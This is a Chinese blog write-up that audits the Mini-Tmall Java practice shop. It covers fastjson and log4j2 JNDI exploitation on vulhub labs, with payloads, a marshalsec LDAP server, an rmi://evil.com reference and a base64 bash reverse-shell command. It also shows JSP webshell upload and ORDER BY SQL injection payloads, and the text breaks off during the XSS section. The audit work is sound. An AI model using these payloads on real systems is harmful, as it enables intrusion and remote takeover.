{"title":"Java代码审计练习项目Mini-Tmall","uid":"b150dfa8a93554c7d2d6ced6f280771f","slug":"Java代码审计练习项目Mini-Tmall","date":"2022-12-10T07:38:39.000Z","updated":"2022-12-14T12:05:41.459Z","comments":true,"path":"api/articles/Java代码审计练习项目Mini-Tmall.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"环境搭建：\"><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h1><p>项目地址：<a href=\"https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E\">https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E</a></p>\n<p>大佬视频教程链接：<a href=\"https://www.bilibili.com/video/BV1i8411e75D/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\">https://www.bilibili.com/video/BV1i8411e75D/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e</a></p>\n<p>参考文档地址：<a href=\"https://www.freebuf.com/articles/web/348349.html\">https://www.freebuf.com/articles/web/348349.html</a></p>\n<p>环境要求：</p>\n<p>Java版本：1.8.0_261，未使用1.8.0_71也能正常编译运行</p>\n<p>Mysql版本：5.7 </p>\n<p>使用的是maven，idea自动导入插件</p>\n<p>前台地址：<a href=\"http://localhost:8080/tmall\">http://localhost:8080/tmall</a></p>\n<p>后台地址：<a href=\"http://localhost:8080/tmall/admin\">http://localhost:8080/tmall/admin</a></p>\n<p>账号：admin     密码：123456</p>\n<h1 id=\"审计：\"><a href=\"#审计：\" class=\"headerlink\" title=\"审计：\"></a>审计：</h1><h2 id=\"第三方组件审计：\"><a href=\"#第三方组件审计：\" class=\"headerlink\" title=\"第三方组件审计：\"></a>第三方组件审计：</h2><p>因为使用的是maven，所以直接查看pom.xml，看第三方库的版本是否是有漏洞的版本。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">组件名称</th>\n<th align=\"center\">版本号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">SpringBoot</td>\n<td align=\"center\">2.6.1</td>\n</tr>\n<tr>\n<td align=\"center\">Mysql</td>\n<td align=\"center\">8.0.27</td>\n</tr>\n<tr>\n<td align=\"center\">druid</td>\n<td align=\"center\">1.2.8</td>\n</tr>\n<tr>\n<td align=\"center\">fastjson</td>\n<td align=\"center\">1.2.78</td>\n</tr>\n<tr>\n<td align=\"center\">taglibs</td>\n<td align=\"center\">1.2.5</td>\n</tr>\n<tr>\n<td align=\"center\">mybatis</td>\n<td align=\"center\">3.5.7</td>\n</tr>\n<tr>\n<td align=\"center\">log4j2</td>\n<td align=\"center\">2.16.0</td>\n</tr>\n</tbody></table>\n<p>这个项目版本跟视频教程里面的项目版本不一样，还有有的组件在pom.xml中没有写出。还是直接看idea里面的外部库查看版本。</p>\n<p>关于第三方组件，当然是查看是否是漏洞版本，高版本是否存在遗留问题，是否存在配置错误问题等等。</p>\n<h3 id=\"fastjson1-2-78：\"><a href=\"#fastjson1-2-78：\" class=\"headerlink\" title=\"fastjson1.2.78：\"></a>fastjson1.2.78：</h3><p>fastjson历史漏洞：<a href=\"https://blog.csdn.net/dreamthe/article/details/125851153\">https://blog.csdn.net/dreamthe/article/details/125851153</a></p>\n<p>漏洞利用：</p>\n<p><a href=\"https://blog.csdn.net/god_zzZ/article/details/107122487\">https://blog.csdn.net/god_zzZ/article/details/107122487</a></p>\n<p><a href=\"https://www.cnblogs.com/mysticbinary/p/12788019.html\">https://www.cnblogs.com/mysticbinary/p/12788019.html</a></p>\n<p>windwos下反弹shell：<a href=\"https://blog.csdn.net/qq_39101049/article/details/96191861\">https://blog.csdn.net/qq_39101049/article/details/96191861</a></p>\n<p>对比发现fastjson的版本小于1.2.80，小于1.2.80存在反序列化漏洞</p>\n<p>全局搜索关键字：<strong>JSON.par</strong></p>\n<p>在ProductContoller.java中存在三次调用，找第一处</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/67.png\"></p>\n<p>往上看代码，发现propertyJson就是通过POST传参。接下来找该方法路由，直接拼接路径访问，发现页面特点：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/68.png\"></p>\n<p>再查找功能点，发现页面是所有商品—添加一件商品，随意输入信息，抓包，修改propertyJson字段为fastjson的dnslog探测payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;40kiqu.dnslog.cn&quot;&#125;</code></pre>\n\n<p>使用dnslog平台，发包，返回500，但是dnslog平台一件收到解析</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/69.png\"></p>\n<p>dnslog：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/70.png\"></p>\n<p>证明存在fastjson反序列化漏洞，windows下就不弹shell了，换成虚拟机里的vulhub玩一玩弹shell的步骤。</p>\n<h4 id=\"fastjson漏洞复现：\"><a href=\"#fastjson漏洞复现：\" class=\"headerlink\" title=\"fastjson漏洞复现：\"></a>fastjson漏洞复现：</h4><p>在Ubuntu虚拟机里开启vulhub靶场的fastjson1.2.47的绕过白名单rce镜像</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">docker-compose up -d</code></pre>\n\n<p>访问<a href=\"http://IP:8090即可看到以下json字段\">http://IP:8090即可看到以下json字段</a></p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">&#123;\n\t&quot;age&quot;:25,\n\t&quot;name&quot;:&quot;Bob&quot;\n&#125;</code></pre>\n\n<p>参考复现教程：<a href=\"https://vulhub.org/#/environments/fastjson/1.2.47-rce/\">https://vulhub.org/#/environments/fastjson/1.2.47-rce/</a></p>\n<p>使用hackerbar发送POST数据包，添加json字段，修改age和name的值，发现页面返回值的name修改成自己提交的值。</p>\n<p>接下来，就是利用。在服务器新建恶意类：</p>\n<p>TouchFile.java：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F; javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n    static &#123;\n        try &#123;\n            Runtime rt &#x3D; Runtime.getRuntime();\n            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;\n            Process pc &#x3D; rt.exec(commands);\n            pc.waitFor();\n        &#125; catch (Exception e) &#123;\n            &#x2F;&#x2F; do nothing\n        &#125;\n    &#125;\n&#125;</code></pre>\n\n<p>修改成反弹shell命令，添加自己vps的IP和端口，之后使用javac编译，再开启python的httpserver，默认端口80</p>\n<p>使用</p>\n<p><a href=\"https://github.com/mbechler/marshalsec\">https://github.com/mbechler/marshalsec</a></p>\n<p>项目，开启LDAP服务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;【公网IP】&#x2F;#Exploit 7776</code></pre>\n\n<p>前面python端口是80，就不需要再LDAP的公网IP后面添加端口</p>\n<p>之后使用nc监听，这个nc的端口是前面java文件里写的端口</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -nlvp xxxx</code></pre>\n\n<p>之后在刚刚的页面，抓取POST数据包，发送到repeater模块，修改json字段为payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#123;\n    &quot;a&quot;:&#123;\n        &quot;@type&quot;:&quot;java.lang.Class&quot;,\n        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;\n    &#125;,\n    &quot;b&quot;:&#123;\n        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,\n        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;evil.com:9999&#x2F;Exploit&quot;,\n        &quot;autoCommit&quot;:true\n    &#125;\n&#125;</code></pre>\n\n<p>这个IP端口是LDAP服务绑定的IP和端口</p>\n<p>发送数据包，就可以在vps上收到shell连接</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/71.png\"></p>\n<p>复现完成就可以关闭docker环境</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker-compose down -v #关闭镜像\ndocker images   #列出所有下载镜像\ndocker rmi --force ID    #删除ID镜像</code></pre>\n\n<h3 id=\"log4j2-2-16-0：\"><a href=\"#log4j2-2-16-0：\" class=\"headerlink\" title=\"log4j2   2.16.0：\"></a>log4j2   2.16.0：</h3><p>这个版本的log4j2，默认关闭了jndi，且删除了msg lookup。查找历史漏洞只存在一个ddos漏洞，就不看了。</p>\n<p>找了很久的文章，发现一篇好文，讲的是log4j2后序修复版本的遗留问题。在2.15.0还是有可能触发rce的，但是2.16.0需要自定义配置并且需要mac系统加上利用链才可能触发反序列化漏洞。</p>\n<p>至于2.17.0的修改配置文件rce，这个。。。。。给我修改的机会，我也不会！</p>\n<p>log4j2漏洞修复遗留问题：<a href=\"https://blog.csdn.net/qsort_/article/details/122101423\">https://blog.csdn.net/qsort_/article/details/122101423</a></p>\n<p>log4j2漏洞利用教程：<a href=\"https://www.freebuf.com/vuls/329984.html\">https://www.freebuf.com/vuls/329984.html</a></p>\n<h4 id=\"log4j2漏洞复现：\"><a href=\"#log4j2漏洞复现：\" class=\"headerlink\" title=\"log4j2漏洞复现：\"></a>log4j2漏洞复现：</h4><p>虽然这个项目没有rce，但是看到这个核弹漏洞，还是复现一波的好。</p>\n<p>还是vulhub：<a href=\"https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md\">https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md</a></p>\n<p>JNDI注入工具：</p>\n<p><a href=\"https://github.com/welk1n/JNDI-Injection-Exploit\">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>\n<p><a href=\"https://github.com/su18/JNDI\">https://github.com/su18/JNDI</a>   这个需要使用文档</p>\n<p>开启docker服务：docker-compose up -d</p>\n<p>访问：<a href=\"http://192.168.0.110:8983/solr/#/\">http://192.168.0.110:8983/solr/#/</a>   看到solr服务页面</p>\n<p>使用dnslog平台，直接使用payload：</p>\n<p><a href=\"http://192.168.0.110:8983/solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.kxapac.dnslog.cn%7D\">http://192.168.0.110:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.kxapac.dnslog.cn}</a></p>\n<p>可以收到Java版本信息：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/81.png\"></p>\n<p>看看能不能反弹shell：</p>\n<p>开启jndi服务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C bash -c &quot;&#123;echo,bash编码的反弹shell命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.0.107</code></pre>\n\n<p>直接使用ldap：<a href=\"http://192.168.0.110:8983/solr/admin/cores?action=$%7Bjndi:ldap://192.168.0.107:1389/fz7elu%7D\">http://192.168.0.110:8983/solr/admin/cores?action=${jndi:ldap://192.168.0.107:1389/fz7elu}</a></p>\n<p>在vps上成功接收shell：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/82.png\"></p>\n<p>记得关环境：  随手关门好习惯</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker-compose down -v #关闭镜像\ndocker images   #列出所有下载镜像\ndocker rmi --force ID    #删除ID镜像</code></pre>\n\n<h2 id=\"任意文件上传：\"><a href=\"#任意文件上传：\" class=\"headerlink\" title=\"任意文件上传：\"></a>任意文件上传：</h2><p>在后台存在管理员上传头像，一些产品上传图片功能</p>\n<p>这个项目代码有中文注释，加上很明显的文件名，稍稍找找就能发现路由代码位置。</p>\n<h3 id=\"管理员头像：\"><a href=\"#管理员头像：\" class=\"headerlink\" title=\"管理员头像：\"></a>管理员头像：</h3><p>先看管理员头像上传的代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;管理员头像上传\n    @ResponseBody\n    @RequestMapping(value &#x3D; &quot;admin&#x2F;uploadAdminHeadImage&quot;, method &#x3D; RequestMethod.POST, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n    public String uploadAdminHeadImage(@RequestParam MultipartFile file, HttpSession session) &#123;\n        String originalFileName &#x3D; file.getOriginalFilename();\n        logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);\n        assert originalFileName !&#x3D; null;\n        String extension &#x3D; originalFileName.substring(originalFileName.lastIndexOf(&#39;.&#39;));\n        &#x2F;&#x2F;生成随机名\n        String fileName &#x3D; UUID.randomUUID() + extension;\n        &#x2F;&#x2F;获取上传路径\n        String filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;adminProfilePicture&#x2F;&quot; + fileName;\n\n        logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);\n        JSONObject jsonObject &#x3D; new JSONObject();\n        try &#123;\n            logger.info(&quot;文件上传中...&quot;);\n            file.transferTo(new File(filePath));\n            logger.info(&quot;文件上传成功！&quot;);\n            jsonObject.put(&quot;success&quot;, true);\n            jsonObject.put(&quot;fileName&quot;, fileName);\n        &#125; catch (IOException e) &#123;\n            logger.warn(&quot;文件上传失败！&quot;);\n            e.printStackTrace();\n            jsonObject.put(&quot;success&quot;, false);\n        &#125;\n        return jsonObject.toJSONString();\n    &#125;</code></pre>\n\n<p>直接获取文件名，之后获取后缀，将其直接与随机uuid拼接，重命名上传文件，直接上传，没有任何过滤操作。</p>\n<p>黑盒测试，发现有前端校验，那就讲webshell修改为jpg后缀，绕过前端校验，之后抓包修改后缀和MIME格式。</p>\n<p>后缀改为jsp，content-type修改为text/plain</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/72.png\"></p>\n<p>收到json格式返回路径，那么直接拼接路径访问：</p>\n<p><a href=\"http://192.168.0.107:8080/tmall/res/images/item/adminProfilePicture/4c50144f-8994-4c63-9c0b-b018a7067097.jsp\">http://192.168.0.107:8080/tmall/res/images/item/adminProfilePicture/4c50144f-8994-4c63-9c0b-b018a7067097.jsp</a></p>\n<p>没有问题，直接使用冰蝎连接</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/73.png\"></p>\n<p>成功执行命令。</p>\n<p>接下来看另一处可以上传文件的地方，产品图片</p>\n<h3 id=\"产品图片：\"><a href=\"#产品图片：\" class=\"headerlink\" title=\"产品图片：\"></a>产品图片：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;上传产品图片-ajax\n    @ResponseBody\n    @RequestMapping(value &#x3D; &quot;admin&#x2F;uploadProductImage&quot;, method &#x3D; RequestMethod.POST, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;utf-8&quot;)\n    public String uploadProductImage(@RequestParam MultipartFile file, @RequestParam String imageType, HttpSession session) &#123;\n        String originalFileName &#x3D; file.getOriginalFilename();\n        logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);\n        String extension &#x3D; originalFileName.substring(originalFileName.lastIndexOf(&#39;.&#39;));\n        String filePath;\n        String fileName &#x3D; UUID.randomUUID() + extension;\n        if (&quot;single&quot;.equals(imageType)) &#123;\n            filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;productSinglePicture&#x2F;&quot; + fileName;\n        &#125; else &#123;\n            filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;productDetailsPicture&#x2F;&quot; + fileName;\n        &#125;\n\n        logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);\n        JSONObject object &#x3D; new JSONObject();\n        try &#123;\n            logger.info(&quot;文件上传中...&quot;);\n            file.transferTo(new File(filePath));\n            logger.info(&quot;文件上传完成&quot;);\n            object.put(&quot;success&quot;, true);\n            object.put(&quot;fileName&quot;, fileName);\n        &#125; catch (IOException e) &#123;\n            logger.warn(&quot;文件上传失败！&quot;);\n            e.printStackTrace();\n            object.put(&quot;success&quot;, false);\n        &#125;\n\n        return object.toJSONString();\n    &#125;\n&#125;</code></pre>\n\n<p>对比前一个管理员头像上传，多了一个imagetype的判断。但是不管是true还是false都会上传，就是路径不一样而已。这个imagetype也是一个参数，可以在包中修改。</p>\n<p>直接和前面一样，上传，抓包，看路径，拼接访问：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/74.PNG\"></p>\n<p>在burp里面选择ation—-&gt;do intercept—-&gt;就一个选项，就会接收上传数据包的响应包：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/75.png\"></p>\n<p>可以看到返回路径，直接访问：<a href=\"http://192.168.0.107:8080/tmall/res/images/item/productSinglePicture/05fd083f-6f5a-448a-9470-74ae2277c0bb.jsp\">http://192.168.0.107:8080/tmall/res/images/item/productSinglePicture/05fd083f-6f5a-448a-9470-74ae2277c0bb.jsp</a></p>\n<p>之后，用冰蝎连接：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/76.png\"></p>\n<p>成功。</p>\n<p>搜索以下upload，发现共有4处，其中一处是前台。</p>\n<h2 id=\"sql注入：\"><a href=\"#sql注入：\" class=\"headerlink\" title=\"sql注入：\"></a>sql注入：</h2><p>使用的是mybatis，直接搜索$( 。但是文件好多，看了大佬的文档，提示只需要找 xxxMapper.xml就行了。</p>\n<p>有点坑的是idea全局搜索，在项目里没找到xml。进入mybatis/mapper目录后，全局查找选择目录找到了。。。。</p>\n<p>共有五处，全是order by语句，并且类型都一样，看一个就行了</p>\n<p>通过对目录的了解，其中前台用户的文件名会使用user，所有查看usermapper.xml，试试前台注入</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;select id&#x3D;&quot;select&quot; resultMap&#x3D;&quot;userMap&quot;&gt;\n     SELECT user_id,user_name,user_nickname,user_password,user_realname,user_gender,user_birthday,user_profile_picture_src,user_address,user_homeplace FROM user\n     &lt;if test&#x3D;&quot;user !&#x3D; null&quot;&gt;\n         &lt;where&gt;\n             &lt;if test&#x3D;&quot;user.user_name !&#x3D; null&quot;&gt;\n                 (user_name LIKE concat(&#39;%&#39;,#&#123;user.user_name&#125;,&#39;%&#39;) or user_nickname LIKE concat(&#39;%&#39;,#&#123;user.user_name&#125;,&#39;%&#39;))\n             &lt;&#x2F;if&gt;\n             &lt;if test&#x3D;&quot;user.user_gender !&#x3D; null&quot;&gt;\n                 and user_gender &#x3D; #&#123;user.user_gender&#125;\n             &lt;&#x2F;if&gt;\n         &lt;&#x2F;where&gt;\n     &lt;&#x2F;if&gt;\n     &lt;if test&#x3D;&quot;orderUtil !&#x3D; null&quot;&gt;\n         ORDER BY $&#123;orderUtil.orderBy&#125;&lt;if test&#x3D;&quot;orderUtil.isDesc&quot;&gt;desc &lt;&#x2F;if&gt;\n     &lt;&#x2F;if&gt;</code></pre>\n\n<p>直接拼接，现在查看使用该sql语句的接口。</p>\n<p>一时半会根本找不到，还好有插件：free-mybatis-tool，直接跳转到java代码。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public interface UserMapper &#123;\n    Integer insertOne(@Param(&quot;user&quot;) User user);\n    Integer updateOne(@Param(&quot;user&quot;) User user);\n\n    List&lt;User&gt; select(@Param(&quot;user&quot;) User user, @Param(&quot;orderUtil&quot;) OrderUtil orderUtil, @Param(&quot;pageUtil&quot;) PageUtil pageUtil);\n    User selectOne(@Param(&quot;user_id&quot;) Integer user_id);\n    User selectByLogin(@Param(&quot;user_name&quot;) String user_name, @Param(&quot;user_password&quot;) String user_password);\n    Integer selectTotal(@Param(&quot;user&quot;) User user);\n&#125;</code></pre>\n\n<p>就是那句List&lt;user，接下来就是ctrl+左键，一直往上面找；</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@Override\n    public List&lt;User&gt; getList(User user, OrderUtil orderUtil, PageUtil pageUtil) &#123;\n        return userMapper.select(user,orderUtil,pageUtil);\n    &#125;</code></pre>\n\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;按条件查询用户-ajax\n @ResponseBody\n @RequestMapping(value &#x3D; &quot;admin&#x2F;user&#x2F;&#123;index&#125;&#x2F;&#123;count&#125;&quot;, method &#x3D; RequestMethod.GET, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n public String getUserBySearch(@RequestParam(required &#x3D; false) String user_name&#x2F;* 用户名称 *&#x2F;,\n                               @RequestParam(required &#x3D; false) Byte[] user_gender_array&#x2F;* 用户性别数组 *&#x2F;,\n                               @RequestParam(required &#x3D; false) String orderBy&#x2F;* 排序字段 *&#x2F;,\n                               @RequestParam(required &#x3D; false,defaultValue &#x3D; &quot;true&quot;) Boolean isDesc&#x2F;* 是否倒序 *&#x2F;,\n                               @PathVariable Integer index&#x2F;* 页数 *&#x2F;,\n                               @PathVariable Integer count&#x2F;* 行数 *&#x2F;) throws UnsupportedEncodingException &#123;\n     &#x2F;&#x2F;移除不必要条件\n     Byte gender &#x3D; null;\n     if (user_gender_array !&#x3D; null &amp;&amp; user_gender_array.length &#x3D;&#x3D; 1) &#123;\n         gender &#x3D; user_gender_array[0];\n     &#125;\n\n     if (user_name !&#x3D; null) &#123;\n         &#x2F;&#x2F;如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);\n         user_name &#x3D; &quot;&quot;.equals(user_name) ? null : URLDecoder.decode(user_name, &quot;UTF-8&quot;);\n     &#125;\n     if (orderBy !&#x3D; null &amp;&amp; &quot;&quot;.equals(orderBy)) &#123;\n         orderBy &#x3D; null;\n     &#125;\n     &#x2F;&#x2F;封装查询条件\n     User user &#x3D; new User()\n             .setUser_name(user_name)\n             .setUser_gender(gender);\n\n     OrderUtil orderUtil &#x3D; null;\n     if (orderBy !&#x3D; null) &#123;\n         logger.info(&quot;根据&#123;&#125;排序，是否倒序:&#123;&#125;&quot;,orderBy,isDesc);\n         orderUtil &#x3D; new OrderUtil(orderBy, isDesc);\n     &#125;\n\n     JSONObject object &#x3D; new JSONObject();\n     logger.info(&quot;按条件获取第&#123;&#125;页的&#123;&#125;条用户&quot;, index + 1, count);\n     PageUtil pageUtil &#x3D; new PageUtil(index, count);\n     List&lt;User&gt; userList &#x3D; userService.getList(user, orderUtil, pageUtil);\n     object.put(&quot;userList&quot;, JSONArray.parseArray(JSON.toJSONString(userList)));\n     logger.info(&quot;按条件获取用户总数量&quot;);\n     Integer userCount &#x3D; userService.getTotal(user);\n     object.put(&quot;userCount&quot;, userCount);\n     logger.info(&quot;获取分页信息&quot;);\n     pageUtil.setTotal(userCount);\n     object.put(&quot;totalPage&quot;, pageUtil.getTotalPage());\n     object.put(&quot;pageUtil&quot;, pageUtil);\n\n     return object.toJSONString();\n &#125;</code></pre>\n\n<p>但是啊！！！很尴尬，找到了，发现xxx是后台的。。。。。。</p>\n<p>看这个方法，就知道是用户管理里的查询。直接输入1之后抓包，可以看到的确是这个：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/77.png\"></p>\n<p>直接使用文档里面的payload：<a href=\"https://www.freebuf.com/articles/web/348349.html\">https://www.freebuf.com/articles/web/348349.html</a></p>\n<p>①、使用rand函数结果显示排序方式不同</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">orderBy&#x3D;rand(1&#x3D;1)\norderBy&#x3D;rand(1&#x3D;2)</code></pre>\n\n<p>②、利用regexp（正则表达式）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">orderBy&#x3D;(select+1+regexp+if(1&#x3D;1,1,0x00)) 正常\norderBy&#x3D;(select+1+regexp+if(1&#x3D;2,1,0x00)) 错误</code></pre>\n\n<p>③、利用updatexml（更新选定XML片段的内容）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">orderBy&#x3D;updatexml(1,if(1&#x3D;1,1,user()),1) 正确\norderBy&#x3D;updatexml(1,if(1&#x3D;2,1,user()),1) 错误</code></pre>\n\n<p>④、利用extractvalue（从目标XML中返回包含所查询值的字符 串）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">orderBy&#x3D;extractvalue(1,if(1&#x3D;1,1,user())) 正确\norderBy&#x3D;extractvalue(1,if(1&#x3D;2,1,user())) 错误</code></pre>\n\n<p>⑤、时间盲注</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">orderBy&#x3D;if(1&#x3D;1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) \n正常响应时间\norderBy&#x3D;if(1&#x3D;2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) \nsleep 2秒</code></pre>\n\n<p>语句错误，返回500，可以布尔，也可以时间盲注。习惯时间了：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/78.png\"></p>\n<p>成功延时2秒</p>\n<p>其他注入点一样</p>\n<h2 id=\"存储型xss：\"><a href=\"#存储型xss：\" class=\"headerlink\" title=\"存储型xss：\"></a>存储型xss：</h2><p>一般是直接用fortify扫描，或是找update和insert语句。其中update语句大多会在页面显示。所以直接找update语句。还要注意是否存在全局过滤。</p>\n<p>这个项目的配置文件和jsp里都没有写过滤设置，全局搜索filter也只有一个管理员账户验证的filter。</p>\n<p>所以，直接找update语句。在AccountController.java里面有一个更新管理员信息的方法：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;更新管理员信息\n @Transactional(propagation &#x3D; Propagation.REQUIRED, rollbackFor &#x3D; Exception.class)\n @ResponseBody\n @RequestMapping(value &#x3D; &quot;admin&#x2F;account&#x2F;&#123;admin_id&#125;&quot;, method &#x3D; RequestMethod.PUT, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n public String updateAdmin(HttpSession session, @RequestParam String admin_nickname&#x2F;*管理员昵称*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_password&#x2F;*管理员当前密码*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_newPassword&#x2F;*管理员新密码*&#x2F;,\n                           @RequestParam(required &#x3D; false) String admin_profile_picture_src&#x2F;*管理员头像路径*&#x2F;,\n                           @PathVariable(&quot;admin_id&quot;) String admin_id&#x2F;*管理员编号*&#x2F;) &#123;\n     logger.info(&quot;获取管理员信息&quot;);\n     Object adminId &#x3D; checkAdmin(session);\n     if (adminId &#x3D;&#x3D; null) &#123;\n         return &quot;admin&#x2F;include&#x2F;loginMessage&quot;;\n     &#125;\n     JSONObject jsonObject &#x3D; new JSONObject();\n     Admin putAdmin &#x3D; new Admin();\n     putAdmin.setAdmin_id(Integer.valueOf(admin_id));\n     putAdmin.setAdmin_nickname(admin_nickname);\n\n     if (admin_password !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_password) &amp;&amp; admin_newPassword !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_newPassword)) &#123;\n         logger.info(&quot;获取需要修改的管理员信息&quot;);\n         Admin admin &#x3D; adminService.get(null, Integer.valueOf(adminId.toString()));\n         if (adminService.login(admin.getAdmin_name(), admin_password) !&#x3D; null) &#123;\n             logger.info(&quot;原密码正确&quot;);\n             putAdmin.setAdmin_password(admin_newPassword);\n         &#125; else &#123;\n             logger.info(&quot;原密码错误，返回错误信息&quot;);\n             jsonObject.put(&quot;success&quot;, false);\n             jsonObject.put(&quot;message&quot;, &quot;原密码输入有误！&quot;);\n             return jsonObject.toJSONString();\n         &#125;\n     &#125;\n     if (admin_profile_picture_src !&#x3D; null &amp;&amp; !&quot;&quot;.equals(admin_profile_picture_src)) &#123;\n         logger.info(&quot;管理员头像路径为&#123;&#125;&quot;, admin_profile_picture_src);\n         putAdmin.setAdmin_profile_picture_src(admin_profile_picture_src.substring(admin_profile_picture_src.lastIndexOf(&quot;&#x2F;&quot;) + 1));\n     &#125;\n\n     logger.info(&quot;更新管理员信息，管理员ID值为：&#123;&#125;&quot;, admin_id);\n     Boolean yn &#x3D; adminService.update(putAdmin);\n     if (yn) &#123;\n         logger.info(&quot;更新成功！&quot;);\n         jsonObject.put(&quot;success&quot;, true);\n         session.removeAttribute(&quot;adminId&quot;);\n         session.invalidate();\n         logger.info(&quot;登录信息已清除&quot;);\n     &#125; else &#123;\n         jsonObject.put(&quot;success&quot;, false);\n         logger.warn(&quot;更新失败！事务回滚&quot;);\n         throw new RuntimeException();\n     &#125;\n\n     return jsonObject.toJSONString();\n &#125;</code></pre>\n\n<p>一直往上面找，直到AdminMapper.xml，发现了调用的语句。使用了预编译：</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;update id&#x3D;&quot;updateOne&quot; 